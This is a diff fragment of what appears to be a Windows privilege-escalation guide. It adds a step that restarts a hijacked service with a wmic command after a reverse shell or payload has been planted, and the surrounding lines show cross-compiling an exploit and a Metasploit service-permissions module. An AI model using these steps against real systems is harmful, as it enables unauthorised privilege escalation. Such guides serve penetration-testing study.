@@ -249,6 +249,12 @@ We then compile it with out cross-compiler, if you are on linux, like this:
 i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
 ```
 
+Okay, so now that we have either create our setuid or our reverse shell we need to restart the program, we can do that using wmci. Like this
+
+```
+wmic service NAMEOFSERVICE call startservice
+```
+
 **Using metasploit**
 ```
 use exploit/windows/local/service_permissions
